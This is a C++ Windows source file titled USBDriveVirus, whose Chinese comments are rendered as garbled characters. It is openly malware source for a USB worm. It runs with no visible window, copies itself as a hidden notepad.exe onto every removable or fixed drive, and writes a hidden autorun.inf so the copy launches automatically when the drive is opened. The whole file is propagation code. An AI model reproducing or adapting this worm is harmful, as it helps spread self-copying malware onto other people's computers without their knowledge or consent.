// USBDriveVirus.cpp : ����Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "USBDriveVirus.h"

#define MAX_LOADSTRING 100

// ȫ�ֱ���: 
HINSTANCE hInst;								// ��ǰʵ��
TCHAR szTitle[MAX_LOADSTRING];					// �������ı�
TCHAR szWindowClass[MAX_LOADSTRING];			// ����������

//������ģ��U�̲�����AutoRun.inf�ļ�
LPWSTR szAutoRun = L"[AutoRun] \
				   	\r\nopen=notepad.exe \
					\r\nsshell\\open=��(&O) \
					\r\nshell\\open\\Command=notepad.exe \
					\r\nshell\\explore\\Command=��Դ������(&X) \
					\r\nshell\\explore\\Command=notepad.exe \
					\r\nshellexcute=notepad.exe \
					\r\nshell\\Auto\\Command=notapad.exe";

// �˴���ģ���а����ĺ�����ǰ������: 
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

//��Ⱦ��������
void infect(LPWSTR pszFile, UINT uDriveType);


int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO:  �ڴ˷��ô��롣
	MSG msg;
	HACCEL hAccelTable;

	// ��ʼ��ȫ���ַ���
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_USBDRIVEVIRUS, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// ִ��Ӧ�ó����ʼ��: 
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_USBDRIVEVIRUS));


	//��ʼ��Ⱦ����
	wchar_t szFileName[MAX_PATH] = { 0 };//�������ڵ�ַ
	wchar_t szRoot[4] = { 0 };//���浱ǰ�ļ������̷�
	UINT uType = 0;//�����������
	//��ȡ��ǰ��������·�����ļ���
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	//��ȡ�����̷�
	lstrcpyn(szRoot, szFileName,4);

	uType = GetDriveType(szRoot);

	switch (uType)
	{
	case DRIVE_FIXED:
	{
		//�����Ӳ���Ͼͼ��һ���Ƿ����ƶ�����
		infect(szFileName, DRIVE_REMOVABLE);
		break;
	}
	case DRIVE_REMOVABLE:
	{
		infect(szFileName, DRIVE_FIXED);
		break;
	}
	default:
		break;
	}

	// ����Ϣѭ��: 
	//while (GetMessage(&msg, NULL, 0, 0))
	//{
	//	if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
	//	{
	//		TranslateMessage(&msg);
	//		DispatchMessage(&msg);
	//	}
	//}
	
	//ȥ������һ��
	msg.wParam = 0;
	return (int) msg.wParam;
}



//
//  ����:  MyRegisterClass()
//
//  Ŀ��:  ע�ᴰ���ࡣ
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_USBDRIVEVIRUS));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_USBDRIVEVIRUS);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   ����:  InitInstance(HINSTANCE, int)
//
//   Ŀ��:  ����ʵ�����������������
//
//   ע��: 
//
//        �ڴ˺����У�������ȫ�ֱ����б���ʵ�������
//        ��������ʾ�����򴰿ڡ�
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   HWND hWnd;

   hInst = hInstance; // ��ʵ������洢��ȫ�ֱ�����

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

   if (!hWnd)
   {
      return FALSE;
   }

   //ShowWindow(hWnd, nCmdShow);
   //UpdateWindow(hWnd);

   return TRUE;
}

//
//  ����:  WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  Ŀ��:    ���������ڵ���Ϣ��
//
//  WM_COMMAND	- ����Ӧ�ó���˵�
//  WM_PAINT	- ����������
//  WM_DESTROY	- �����˳���Ϣ������
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// �����˵�ѡ��: 
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO:  �ڴ���������ͼ����...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// �����ڡ������Ϣ�������
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

void infect(LPWSTR pszFile, UINT uDriveType){
	wchar_t szDriveString[MAXBYTE] = { 0 };
	DWORD dwRet = 0;
	DWORD iNum = 0;
	wchar_t szRoot[4] = { 0 };
	UINT uType = 0;
	wchar_t szTarget[MAX_PATH] = { 0 };

	dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);//��ȡ���������߼�������

	while (iNum<dwRet)
	{
		lstrcpyn(szRoot,szDriveString+iNum, 4);
		uType = GetDriveType(szRoot);//��ȡ����������
		if (uType == uDriveType){
			//�����ļ�
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, L"notepad.exe");

			//int res=
			CopyFile(pszFile, szTarget, FALSE);
			
			//CString ercd;
			//ercd.Format(_T("%d"),res);
			//MessageBox(NULL, szTarget, L"GG", MB_OK);
			
			//����notepad.exeΪ��������
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
			//����AutoRun.inf�ļ�
			lstrcpy(szTarget, szRoot);
			lstrcat(szTarget, L"autorun.inf");
			HANDLE hFile = CreateFile(szTarget, //�����ļ����
				GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);

			//ercd.Format(_T("%d"), GetLastError());
			//MessageBox(NULL, ercd, L"GG", MB_OK);
			DWORD dwWritten = 0;
			WriteFile(hFile, szAutoRun, sizeof(szAutoRun), &dwWritten, NULL);
			CloseHandle(hFile);
			//����autorun.infΪ��������
			SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
		}
		iNum += 4;
	}
}